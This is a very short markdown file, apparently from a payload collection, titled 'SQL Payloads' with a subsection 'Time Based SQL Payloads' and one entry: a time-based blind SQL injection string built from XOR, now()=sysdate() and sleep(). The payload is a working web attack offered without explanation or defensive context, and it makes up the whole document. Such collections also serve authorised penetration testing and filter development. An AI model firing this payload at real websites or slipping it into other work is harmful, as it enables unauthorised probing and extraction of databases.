# SQL Payloads
## Time Based SQL Payloads
```sql
'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
```
